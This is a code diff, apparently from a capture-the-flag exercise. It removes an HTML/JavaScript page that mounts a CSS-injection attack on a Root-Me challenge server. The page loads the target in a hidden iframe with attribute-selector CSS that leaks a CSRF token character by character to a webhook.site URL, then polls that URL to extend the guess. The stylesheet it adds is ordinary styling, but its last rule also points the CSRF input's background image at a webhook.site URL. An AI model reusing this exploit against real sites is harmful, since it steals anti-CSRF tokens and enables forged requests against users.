@@ -1,85 +1,110 @@
-<html>
-    <style>
-        #current {
-            font-size: 32px;
-            color: red;
-        }
+* {
+	box-sizing: border-box;
+	outline: none;
+}
 
-        #time_to_next {
-            font-size: 24px;
-            color: black;
-        }
+html, body {
+	width: 100%;
+	margin: 0;
+	padding: 0;
+	color: #ffffff;
+	background: #c94c4c;
+}
 
-        #frames {
-            visibility: hidden;
-        }
-    </style>
-    <body>
-        <div id="current"></div>
-        <div id="time_to_next"></div>
-        <div id="frames"></div>
-    </body>
-    <script>
-        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split("");
-        known = "";
-        target_time = new Date();
-        timer = 0;
+.wrapper {
+	width: 75%;
+	margin: auto;
+}
 
-        function test_char(known, chars) {
-            // Remove all the frames
-            document.getElementById("frames").innerHTML = "";
+.title {
+	float: left;
+}
 
-            // Append the chars with the known chars
-            css = build_css(chars.map(v => known + v));
+.styles {
+	float: right;
+    list-style: none;
+}
 
-            // Create an iframe to try the attack. If `X-Frame-Options` is blocking this you could use a new tab...
-            frame = document.createElement("iframe");
-            frame.src = "http://challenge01.root-me.org:58005/?style=" + css;
-            frame.style="visibility: hidden;"; //gotta be sneaky sneaky like
-            document.getElementById("frames").appendChild(frame);
+.styles > a > li {
+	display: inline-block;
+	width: 1.5em;
+	height: 1.5em;
+	border: 0.1em solid #aaaaaa;
+	border-radius: 0.25em;
+}
 
-            // timer stuff because we want to be l33t
-            clearInterval(timer);
-            target_time = new Date();
-            target_time.setSeconds(target_time.getSeconds() + 3);
-            timer = setInterval(function() {
-                var current_time = new Date();
-                diff = target_time - current_time;
-                document.getElementById("time_to_next").innerHTML = "Time to next reload: " + diff / 1000;
-            }, 50);
+.styles > a > li.light {
+	background: #dddddd;
+}
 
-            // in 3 seconds, after the iframe loads, check to see if we got a response yet
-            setTimeout(function() {
-                var oReq = new XMLHttpRequest();
-                oReq.addEventListener("load", known_listener);
-                oReq.open("GET", "https://webhook.site/9b4d15f9-6b9a-4a46-9a82-6ad47d0228f5/yVtQbBTqlzqEqSrV1ejg4d4mNg9vu7U");
-                oReq.send();
-            }, 3000);
-        }
+.styles > a > li.dark {
+	background: #353535;
+}
 
-        function build_css(values) {
-            css_payload = "";
-            for(var value in values) {
-                css_payload += "input[name=csrf][value^="
-                    + values[value]
-                    + "]~*{background-image:url(https://webhook.site/9b4d15f9-6b9a-4a46-9a82-6ad47d0228f5/"
-                    + values[value]
-                    + ")%3B}"; //can't use an actual semicolon because that has a meaning in a url
-            }
-            return css_payload;
-        }
+.styles > a > li.red {
+	background: #cc0000;
+}
 
-        function known_listener () {
-            document.getElementById("current").innerHTML = "Current Token: " + this.responseText;
-            if(known != this.responseText) {
-                known = this.responseText;
-                test_char(known, chars);
-            } else {
-                known = this.responseText;
-                alert("CSRF token is: " + known);
-            }
-        }
+.styles > a > li.green {
+	background: #82b74b;
+}
 
-        test_char("", chars);
-    </script>
-</html>
+.styles > a > li.blue {
+	background: #034f84;
+}
+
+.styles > a > li.purple {
+	background: #50394c;
+}
+
+.styles > a > li.pink {
+	background: #d64161;
+}
+
+.container {
+	width: 90%;
+	margin: auto;
+}
+
+.clear {
+	clear: both;
+}
+
+hr {
+	border-style: solid;
+	border-color: #353535;
+}
+
+form > input {
+	display: block;
+	width: 20em;
+	margin: 1em;
+	padding: 0.5em;
+	border: 0.25em solid #dddddd;
+	border-radius: 0.1em;
+}
+
+form > textarea {
+	width: 40em;
+	height: 10em;
+	margin: 1em;
+	padding: 0.5em;
+	border: 0.25em solid #dddddd;
+	border-radius: 0.1em;
+}
+
+form > input:focus, form > textarea:focus {
+	border-color: #87bdd8;
+}
+
+form > input[type='submit'] {
+	width: 10em;
+}
+
+.csrf {
+        visibility: hidden;
+}
+
+input[name=csrf]{
+    background-image: url(https://webhook.site/17ccedcf-df81-4a07-8ddc-851a2fbcf37a);
+}
